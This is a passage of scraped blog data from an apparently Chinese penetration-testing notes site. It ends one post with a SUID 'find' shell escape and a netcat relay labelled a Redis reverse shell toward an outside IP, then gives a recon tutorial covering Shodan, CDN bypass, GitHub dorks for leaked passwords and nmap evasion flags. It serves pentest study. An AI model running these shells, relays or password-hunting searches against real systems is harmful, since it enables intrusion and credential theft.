data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;mkdir abc&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find abc -exec &#39;/bin/sh&#39; \\;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&quot;docker-group\&quot;&gt;Docker group&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#docker-group\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;h3 id=\&quot;service-vulnerability\&quot;&gt;Service vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#service-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netstat -antup&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Redis reverse shell.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -l 12345 | nc 102.168.191.170 80&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;windows\&quot;&gt;Windows&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;5-domain-penetration\&quot;&gt;5 Domain penetration&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#5-domain-penetration\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;port-scan&quot;],&quot;text&quot;:[0,&quot;Port scan&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;web-scan&quot;],&quot;text&quot;:[0,&quot;Web scan&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;vulnerability-analysis&quot;],&quot;text&quot;:[0,&quot;Vulnerability analysis&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;exploitation&quot;],&quot;text&quot;:[0,&quot;Exploitation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;smb&quot;],&quot;text&quot;:[0,&quot;smb&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;kernel-stack-overflow&quot;],&quot;text&quot;:[0,&quot;Kernel stack overflow&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;plain-password-of-root&quot;],&quot;text&quot;:[0,&quot;Plain password of root&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;password-reuse&quot;],&quot;text&quot;:[0,&quot;Password reuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;sudo-abuse&quot;],&quot;text&quot;:[0,&quot;Sudo abuse&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;su-root-prohibited&quot;],&quot;text&quot;:[0,&quot;’su root’ prohibited&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;scheduled-task&quot;],&quot;text&quot;:[0,&quot;Scheduled task&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;suid&quot;],&quot;text&quot;:[0,&quot;SUID&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;environment-variable-hijacking&quot;],&quot;text&quot;:[0,&quot;Environment variable hijacking&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;administrator-configuration-error&quot;],&quot;text&quot;:[0,&quot;Administrator configuration error&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;docker-group&quot;],&quot;text&quot;:[0,&quot;Docker group&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;service-vulnerability&quot;],&quot;text&quot;:[0,&quot;Service vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;windows&quot;],&quot;text&quot;:[0,&quot;Windows&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;5-domain-penetration&quot;],&quot;text&quot;:[0,&quot;5 Domain penetration&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/5&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/信息收集&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;信息收集&quot;],&quot;date&quot;:[3,&quot;2023-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 前言\n\n方式：主动扫描，开放搜索等。\n\n开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。\n\n基础信息：IP、网段、域名、端口。\n\n应用信息：各端口的应用。例如web应用、邮件应用、等等。\n\n系统信息：操作系统版本\n\n版本信息：所有这些探测到的东西的版本。\n\n服务信息：中间件的各类信息，插件信息。\n\n人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。\n\n防护信息：试着看能否探测到防护设备。\n\n![](img/1.png)\n\n逆向pwn ,逆向工程、web、移动\n\n主动信息收集：通过直接访问、扫描网站，这种流量将流经网站\n\n被动信息收集：利用第三方的服务对目标进行访问了解，比例： Shodan搜索等\n\n详见Shodan使用手册。\n\n# 在线搜索（Shodan）\n\nShodan 是一个搜索引擎，但它与 Google 这种搜索网址的搜索引擎不同，Shodan 是用来搜索网络空间中在线设备的，你可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。\n\n\n在windows系统上访问Shodan只需要访问链接：https://www.shodan.io/\n\n## Shodan工作原理\n\n那么 Shodan 是怎么工作的呢？Shodan 通过扫描全网设备并抓取解析各个设备返回的 banner 信息，通过了解这些信息 Shodan 就能得知网络中哪一种 Web 服务器是最受欢迎的，或是网络中到底存在多少可匿名登录的 FTP 服务器，或者哪个ip对应的主机是哪种设备。\n\n## Shodan的使用\n\n我们在左上角输入我们要搜索的关键字，然后下面就出来搜索结果了。比如我们搜索 SSH\n![](img/2.png)\n上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：\n```\nResults map – 搜索结果展示地图\nTop services (Ports) – 使用最多的服务/端口\nTop organizations (ISPs) – 使用最多的组织/ISP\nTop operating systems – 使用最多的操作系统\nTop products (Software name) – 使用最多的产品/软件名称\n```\n随后，在中间的主页面我们可以看到包含如下的搜索结果：\n```\nIP 地址\n主机名\nISP\n该条目的收录收录时间\n该主机位于的国家\nBanner 信息\n```\n想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。\n![](img/3.png)\n\n我们还可以点击 Exploits ，Shodan 就会帮我们查找针对不同平台、不同类型可利用的 exploits。当然也可以通过直接访问网址来自行搜索：[https://exploits.shodan.io/welcome；](https://exploits.shodan.io/welcome%EF%BC%9B)\n\n![](img/4.png)\n\n我们还可以点击Maps，查看设备分布的地图\n![](img/5.png)\n\n如果我们想生成报表，我们可以点击Create Report\n![](img/6.png)\n\n我们还可以直接点击 Explore ，看网络上其他用户使用最多的搜索\n![](img/7.png)\n如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤。\n## 使用搜索过滤\n```\nhostname：搜索指定的主机或域名，例如hostname:\&quot;google\&quot;\nport：搜索指定的端口或服务，例如port:\&quot;21\&quot;\ncountry：搜索指定的国家，例如country:\&quot;CN\&quot;\ncity：搜索指定的城市，例如city:\&quot;Hefei\&quot;\norg：搜索指定的组织或公司，例如org:\&quot;google\&quot;\nisp：搜索指定的ISP供应商，例如isp:\&quot;China Telecom\&quot;\nproduct：搜索指定的操作系统/软件/平台，例如product:\&quot;Apache httpd\&quot;\nversion：搜索指定的软件版本，例如 version:\&quot;1.6.2\&quot;\ngeo：搜索指定的地理位置，参数为经纬度，例如 geo:\&quot;31.8639, 117.2808\&quot;\nbefore/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:\&quot;11-11-15\&quot;\nnet：搜索指定的IP地址或子网，例如 net:\&quot;210.45.240.0/24\&quot;\nKali中安装 Shodan\n```\nShodan 是由官方提供的 Python 库\n\n## Kali中安装 Shodan\n\nShodan 是由官方提供的 Python 库\n\n安装命令：\n```\ngit clone https://github.com/achillean/shodan-python.git &amp;&amp; cd shodan-python\npython setup.py install\n```\n## Kali中Shodan的使用\n\n官方用法：Shodan Command-Line Interface\nCommands:\n```\nalert Manage the network alerts for your account # 管理账户的网络提示\nconvert Convert the given input data file into a... # 转换输入文件\ncount Returns the number of results for a search # 返回查询结果数量\ndownload Download search results and save them in a... # 下载查询结果到文件\nhoneyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐\nhost View all available information for an IP... # 显示一个 IP 所有可用的详细信息\ninfo Shows general information about your account # 显示账户的一般信息\ninit Initialize the Shodan command-line # 初始化命令行\nmyip Print your external IP address # 输出用户当前公网IP\nparse Extract information out of compressed JSON... # 解析提取压缩的JSON信息，即使用download下载的数据\nscan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段\nsearch Search the Shodan database # 查询 Shodan 数据库\nstats Provide summary information about a search... # 提供搜索结果的概要信息\nstream Stream data in real-time. # 实时显示流数据\n初始化Shodan：shodan init API_Key\n返回查询结果的数量：shodan  count  SSH\n```\n将查询到的结果下载：shodan download microsoft-data microsoft iis 6.0 。将搜索结果下载到  microsoft-data 文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载 100 条结果。如果我们想获取更多的结果，需要我们花钱注册，然后下载的时候指定--limit参数。\n![](img/8.png)\n解析下载的数据：shodan parse --fields ip_str,port,org --separator , microsoft-data.json.gz\n![](img/9.png)\n\n查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。\n![](img/10.png)\nshodan search microsoft iis 6.0\nsearch查找，直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据\n![](img/11.png)\n\n当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：\n```\nshodan search --fields ip_str,port,org,hostnames microsoft iis 6.0\n```\n![](img/12.png)\n\n## MSF中使用Shodan\n```\nuse auxiliary/gather/shodan_search #使用shodan模块\nset shodan_apikey xxxxxxxx #设置shodan的API\nset query JAWS/1.0 #设置查询词\nexploit\n```\n![](img/13.png)\n\n# 域名信息收集\n\n## 通过域名查询IP\n\n### 查询网站\n\n使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN\n\nping测试网站有：\nhttps://wepcc.com/\nhttp://ping.chinaz.com/\nhttp://ping.aizhan.com/\n### 什么是CDN\n在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。\n#### 2.1.1.3 CDN的优势\n提高用户访问速率，优化用户使用体验。\n隐藏真实服务器的IP\n提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。\n### 几种访问方式的不同\n传统访问：用户访问域名--&gt;解析服务器IP--&gt;访问目标主机\n普通CDN：用户访问域名--&gt;CDN节点--&gt;真实服务器IP--&gt;访问目标主机\n带WAF的CDN：用户访问域名--&gt;CDN节点（云WAF）--&gt;真实服务器IP--&gt;访问目标主机\n### CDN的配置\n将域名的 NS 记录指向 CDN 厂商提供的 DNS 服务器。\n给域名设置一个 CNAME 记录，将它指向CDN厂商提供的另一个域名。\n所以在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。\n查询域名相关的网站：\n\n* DNS查询：https://dnsdb.io/zh-cn/\n* 微步在线：https://x.threatbook.cn/\n* 在线域名信息查询：http://toolbar.netcraft.com/site_report?url=\n* DNS、IP等查询：http://viewdns.info/\n* CDN查询IP：https://tools.ipip.net/cdn.php\n* SecurityTrails平台：https://securitytrails.com/domain/www.baidu.com/history/a\n\n## 绕过CDN的方法\n\n### 查询子域名\n\n通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：https://phpinfo.me/domain/\n\n通过查询DNS服务器，查询该域下的解析记录\n\n通过HTTPS证书来查询(只适用于https网站) ，如：[https://crt.sh/就是通过https证书查询子域名](https://crt.sh/%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87https%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D)\n\n通过google查询\n\n### 查询主域名\n\n以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。\n\n### 邮件服务器\n\n一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。\n\n### 查看域名历史解析记录\n\n也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com 来观察域名的IP历史记录。\n\n#### 国外访问\n\n国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php 访问 ，可能会得到真实的ip地址。\n\n### Nslookup查询\n查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n各种解析记录\n* A 主机记录，记录域名对应的ip\n* PTR 反向地址解析记录，记录ip对应的域名\n* CNAME 别名记录\n* MX 邮箱交换记录\n* NS 服务器记录\n* SOA 权威记录\n* TXT 为记录说明\n* SRV 列出了正在提供特定服务的服务器\n* AAAA ipv6地址记录\nA (Address) 记录也叫主机记录，是用来指定域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。通俗来说A记录就是服务器的IP，域名绑定A记录就是告诉DNS，当输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。在命令行下可以通过nslookup -qt=a www.baidu.com来查看A记录。\n![](img/14.png)\n\n### 网站漏洞\n\n利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址\n\n### Censys查询SSL证书找到真实IP\n\n利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在[https://crt.sh上查找目标网站SSL证书的HASH](https://crt.xn--shSSLHASH-rb6nx5at77oxxownaz80pknbhz7al4su67c)，然后再用Censys搜索该HASH即可得到真实IP地址。\n\n## 域名的whois信息\n\nwhois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。\n\n查询的网站：http://whois.chinaz.com/\n\n# 公司敏感信息收集\n\n当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。\n\n在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)\n\n## Github的搜索\n\n访问[https://github.com/；Github的搜索语法：](https://github.com/%EF%BC%9BGithub%E7%9A%84%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%EF%BC%9A)\n```\nin:name test #仓库标题搜索含有关键字 SpringCloud\nin:descripton test #仓库描述搜索含有关键字\nin:readme test #Readme文件搜素含有关键字\nstars:&gt;3000 test #stars数量大于3000的搜索关键字\nstars:1000..3000 test #stars数量大于1000小于3000的搜索关键字\nforks:&gt;1000 test #forks数量大于1000的搜索关键字\nforks:1000..3000 test #forks数量大于1000小于3000的搜索关键字\nsize:&gt;=5000 test #指定仓库大于5000k(5M)的搜索关键字\npushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字\ncreated:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字\nuser:test #用户名搜素\nlicense:apache-2.0 test #明确仓库的 LICENSE 搜索关键字\nlanguage:java test #在java语言的代码中搜索关键字\nuser:test in:name test #组合搜索,用户名test的标题含有test的\n```\n## 使用 Github 进行邮件配置信息收集\n\n很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。\n```\nsite:Github.com smtp\nsite:Github.com smtp @qq.com\nsite:Github.com smtp @126.com\nsite:Github.com smtp @163.com\nsite:Github.com smtp @sina.com.cn\nsite:Github.com smtp password\nsite:Github.com String password smtp\n……\n```\n我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的\n`site:Github.com smtp @baidu.com`\n\n## 使用Github进行数据库信息收集\n```\nsite:Github.com sa password\nsite:Github.com root password\nsite:Github.com User ID=’sa’;Password\nsite:Github.com inurl:sql\n```\n## 使用Github进行 SVN 信息收集\n```\nsite:Github.com svn\nsite:Github.com svn username\nsite:Github.com svn password\nsite:Github.com svn username password\n```\n## 使用Github进行综合信息收集\n```\nsite:Github.com password\nsite:Github.com ftp ftppassword\nsite:Github.com 密码\n```\n# 网站指纹识别\n\n在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。\n常见的网站指纹识别工具有：whatweb等。\n在线指纹识别网站：\n* BugScaner：http://whatweb.bugscaner.com/look/\n* 云悉指纹：http://www.yunsee.cn/finger.html\n* WhatWeb：https://whatweb.net/\n\n# 整站分析\n\n## 服务器类型（Linux/windows）\n\n判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的\n\n而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来\n\n## 网站容器（Apache/Nginx/Tomcat/IIS）\n\n知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞\n\n## 脚本类型（php/jsp/asp/aspx）\n\n我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。\n\n1. 可以根据网站URL来判断\n\n2. site:xxx filetype:php\n\n3. 可以根据Firefox的插件来判断\n\n## 数据库类型（Mysql/Oracle/Access/SQLserver）\n\n我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的\n\n几种数据库的区别:\n\n* Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb   一般是asp的网页文件用access数据库\n\n* SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf\n\n* MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306\n\n* Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521\n\n首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。\n\n常见搭配：\n\n* ASP 和 ASPX：ACCESS、SQL Server\n\n* PHP：MySQL、PostgreSQL\n\n* JSP：Oracle、MySQL\n\n# 第六章主机扫描\n\n对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。\n\n主机扫描的工具也有很多，比如：Nessus、AWVS\n\n\n# 第七章端口扫描（nmap）\n\n需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：\n\n* 22——&gt;ssh弱口令\n* 873——&gt;rsync未授权访问漏洞\n* 306——&gt;mysql弱口令\n* 6379——&gt;redis未授权访问漏洞\n端口扫描工具有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低。\nmasscan示例 ：\n```\nmasscan 192.168.10.152 -p 0-65535 --rate=10000\n```\n## nmap简介\n\nnmap四项基本功能：\n1. 主机发现 (Host Discovery)\n\\-sn,-PE/PP/PM\n2. 端口扫描 (Port Scanning)\n\\-sS,-sT,-sA, -sN/sF/sX,-sU, -sY/-sZ\n3. 版本侦测 (Version Detection)\n\\-sV（可查看自定义的端口服务）\n4. 操作系统侦测 (Operating System Detection)\n\\-O，-osscan-limit,-osscan-guess,\n而在这四项功能的基础上，nmap还提供防火墙和 IDS 的规避技巧，可以综合运用到四个基本功能的各个阶段。另外nmap还提供强大的NSE(Nmap Scripting Language)脚本引擎功能，脚本可以对基本功能进行补充和扩展。\n**nmap参数**\n\nnmap –iflist : 查看本地主机的接口信息和路由信息\n\n\\-A ：选项用于使用进攻性方式扫描\n\n\\-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4\n\n\\-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开\n\n\\-oA test.xml: 将扫描结果生成 test.xml 文件，中断后，结果也可保存\n\n\\-oG test.txt: 将扫描结果生成 test.txt 文件\n\n\\-sn : 只进行主机发现，不进行端口扫描\n\n\\-O : 指定Nmap进行系统版本扫描\n\n\\-sV: 指定让Nmap进行服务版本扫描\n\n\\-p &amp;lt;port ranges&amp;gt;: 扫描指定的端口\n\n\\-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描\n\n\\-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况\n\n\\-script &amp;lt;script name&amp;gt; : 指定扫描脚本\n\n\\-Pn ： 不进行ping扫描\n\n\\-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping\n\n\\-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。\n\n\\-iL 1.txt : 批量扫描1.txt中的目标地址\n\n\\-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现\n\n\\-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况\n\n\\-sO: 使用IP protocol 扫描确定目标机支持的协议类型\n\n\\-PO : 使用IP协议包探测对方主机是否开启\n\n\\-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机\n\n\\-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现\n\n\\-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态\n\n\\-e eth0：指定使用eth0网卡进行探测\n\n\\-f : --mtu &amp;lt;val&amp;gt;: 指定使用分片、指定数据包的 MTU.\n\n\\-b &amp;lt;FTP relay host&amp;gt;: 使用FTP bounce scan扫描方式\n\n\\-g： 指定发送的端口号\n\n\\-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）\n\n\\-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态\n\n\\-n : 表示不进行DNS解析；\n\n\\-D &amp;lt;decoy1,decoy2\\[,ME\\],...&amp;gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址\n\n\\-R ：表示总是进行DNS解析。\n\n\\-F : 快速模式，仅扫描TOP 100的端口\n\n\\-S &amp;lt;IP_Address&amp;gt;: 伪装成其他 IP 地址\n\n\\--ttl &amp;lt;val&amp;gt;: 设置 time-to-live 时间\n\n\\--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）\n\n\\--dns-servers : 指定DNS服务器\n\n\\--system-dns : 指定使用系统的DNS服务器\n\n\\--traceroute : 追踪每个路由节点\n\n\\--scanflags &amp;lt;flags&amp;gt;: 定制TCP包的flags\n\n\\--top-ports &amp;lt;number&amp;gt; :扫描开放概率最高的number个端口\n\n\\--port-ratio &amp;lt;ratio&amp;gt;: 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\n\\--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）\n\n\\--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统\n\n\\--data-length &amp;lt;num&amp;gt;: 填充随机数据让数据包长度达到 Num\n\n\\--ip-options &amp;lt;options&amp;gt;: 使用指定的 IP 选项来发送数据包\n\n\\--spoof-mac &amp;lt;mac address/prefix/vendor name&amp;gt; : 伪装 MAC 地址\n\n\\--version-intensity &amp;lt;level&amp;gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。\n\n\\--version-light: 指定使用轻量侦测方式 (intensity 2)\n\n\\--version-all: 尝试使用所有的probes进行侦测 (intensity 9)\n\n\\--version-trace: 显示出详细的版本侦测过程信息\n\nnmap 192.168.1.0/24 -exclude 192.168.1.10 #扫描除192.168.1.0外的该网段的其他地址\n\nnmap 192.168.1.0/24 -excludefile f:/1.txt #扫描除给定文件中的地址以外的其他地址\n\n\n## nmap基本功能\n\n### 探测目标主机是否在线\n\n##### 当探测公网IP时\n\n**nmap 